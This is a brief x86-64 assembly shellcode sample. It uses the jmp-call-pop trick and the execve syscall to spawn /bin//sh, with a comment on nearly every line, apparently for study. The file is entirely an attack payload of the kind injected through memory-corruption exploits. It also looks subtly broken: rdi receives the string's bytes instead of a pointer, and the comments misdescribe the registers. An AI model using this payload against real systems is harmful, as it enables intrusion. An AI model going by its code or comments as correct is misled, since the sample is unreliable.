global _start

section .text

_start:
    jmp binSH_jmp       ; jmp to label binSH_jmp

pop_shell:
    ; [ /bin//sh ]
    xor rax, rax        ; Zeroes rax register
    mov rdi, [rsp]      ; rdi - /bin//sh, [rsp] means the actual value in rsp and not the stack address

    ; [ ptr to /bin//sh | null | /bin//sh ] 
    push rax            ; null terminator
    push rdi            ; ptr to /bin//sh
    mov rsi, rsp        ; rsi - Stack address pointing to /bin//sh

    mul rdx             ; rdx - 0
    add al, 59          ; Syscall number for execve()
    syscall             ; Calls kernel

binSH_jmp:
    call pop_shell      ; When pop_shell is called the address of the next instruction, binSH: db '/bin//sh' is inserted into the stack
    binSH: db '/bin//sh'
